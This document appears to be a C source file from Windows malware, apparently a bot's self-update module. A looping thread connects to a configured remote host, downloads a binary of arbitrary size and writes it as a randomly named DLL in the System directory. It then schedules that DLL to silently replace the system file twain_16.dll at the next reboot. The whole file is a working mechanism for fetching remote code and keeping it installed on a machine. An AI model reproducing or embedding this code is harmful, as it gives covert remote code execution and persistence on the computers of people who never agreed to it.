#include "stdafx.h"
#include "extern.h"

DWORD WINAPI monitor_updates(LPVOID param)
{
	WSADATA			wsaData;
	SOCKET			stcp;
	sockaddr_in		sin;
	char			buffer[16384], *fbuf;
	int				*one, onetime;

	one = (int*) param;
	onetime = *one;
	deb("UPDATE one time = %d", onetime);
	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);

	if (iResult != NO_ERROR) 
	{
		deb("Error at WSAStartup()\n");
		ExitThread(ERR);
	}
restart:
	for(;;) 
	{
		stcp = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (stcp == INVALID_SOCKET) 
		{
			deb("Error at socket(): %ld\n", WSAGetLastError());
			WSACleanup();
			Sleep(1000);
			continue;
		}
		
		deb("tcp update: waiting for internet connection...");
		while(!inet_alive)
			Sleep(5000);
		
		deb("tcp update: inet alive");
		
		memset(&sin, 0, sizeof(sin));

		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = resolve(TCP_UPDATE_HOST);
		sin.sin_port = htons(TCP_UPDATE_PORT);

		if(sin.sin_addr.s_addr == NULL) 
		{
			deb("sin == NULL");
			Sleep(1000);
			continue;
		}
		
		if(connect( stcp, (SOCKADDR*) &sin, sizeof(sin) ) == SOCKET_ERROR) 
		{
			deb( "TCP_UPDATE: Failed to connect to %s [%s/%d]. %s (WSA:%d)\n",
				TCP_UPDATE_HOST,inet_ntoa(sin.sin_addr),ntohs(sin.sin_port), FORMATERROR, WSAGetLastError() );
			closesocket(stcp);
			Sleep(CONNECT_SLEEP * 3);
			continue;
		}
		
		deb("Connected to update service.");
		
		/* do job */
		struct update_msg msg;
		
		strcpy(buffer, UPDATE_VERSION);
		send(stcp, buffer, strlen(buffer), 0);

		int res = recv(stcp, (char*) &msg, sizeof(msg), 0);
		if(res == 0 || res == SOCKET_ERROR) 
		{
			deb("no update needed or connection dropped");
		}
		else 
		{
			deb("new: fsize: %d checksum: 0x%x ver: %d", msg.size, msg.checksum, msg.version);
			fbuf = (char*) halloc(msg.size + 1);
			if(fbuf == NULL)
			{
				deb("failed to alloc %d bytes", msg.size);
				closesocket(stcp);
				Sleep(MONITORING_INTERVAL / 2);
				continue;
			}
			int bleft = msg.size;
			int res = 0;
			char *pbuf = fbuf;
			while(bleft) 
			{
				pbuf += res;
				res = recv(stcp, pbuf, bleft, 0);
				if(res == 0 || res == SOCKET_ERROR) 
				{
					deb("connection lost while updating! res: %d", res);
					deb("WSAERROR: %d", WSAGetLastError());
					hfree(fbuf);
					closesocket(stcp);
					Sleep(MONITORING_INTERVAL / 2);
					goto restart;
				}
				deb("update read %d bytes", res);
				bleft -= res;
			}
			write_file(fbuf, msg.size, msg.checksum);
			hfree(fbuf);
		}
		closesocket(stcp);
		/* end of session update */

		if(onetime) 
		{
			deb("Exiting update thread due to one update.");
			ExitThread(0);
		}

		deb("tcp update: sleeping for %d hours", ((MONITORING_INTERVAL / 1000) / 60) / 60);
		Sleep(MONITORING_INTERVAL);
	}

	ExitThread(0);
}

int write_file( char *pbuf, u_int size, u_int checksum ) 
{
	char szWinDir[MAX_PATH];
	char tmpf[18];
	HANDLE hFile;
	DWORD term = STILL_ACTIVE;
	char szTwain[MAX_PATH];
	char szWininit[MAX_PATH];
	u_int	lchecksum;

	GetSystemDirectory(szWinDir,MAX_PATH);
	GetRandStr(5,tmpf);
	lstrcat(szWinDir,"\\");
	lstrcat(szWinDir, tmpf);
	lstrcat(szWinDir,".dll");
	GetWindowsDirectory(szTwain,MAX_PATH);
	lstrcpy(szWininit, szTwain);
	lstrcat(szTwain,"\\twain_16.dll");
	lstrcat(szWininit, "\\wininit.ini");

	hFile = CreateFile(szWinDir, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, NULL,                      
		CREATE_ALWAYS,	FILE_ATTRIBUTE_NORMAL, NULL);                    
	
	if (hFile == INVALID_HANDLE_VALUE) 
	{ 
		deb("write_file:createfile: %s", FORMATERROR);
		return -1;
	} 

	DWORD dwWritten;
	WriteFile(hFile, pbuf, size, &dwWritten, NULL);
	CloseHandle(hFile);

	lchecksum = checksumfile(szWinDir);
	if(lchecksum != checksum) 
	{
		DeleteFile(szWinDir);
		deb("checksum failed: local: 0x%05x in packet: 0x%05x", lchecksum, checksum);
		return -1;
	}

	if( FileAccess( szWinDir, GENERIC_READ ) ) 
	{
		deb("no access to file");
		return -1;
	}

	deb("%s => %s", szWinDir, szTwain);
	if(!MoveFileEx(szWinDir, szTwain, MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_REPLACE_EXISTING )) 
	{
		deb("movefile: %s", FORMATERROR);
		return -1;
	}

	deb("file placed to update at next boot");
	return 0;
}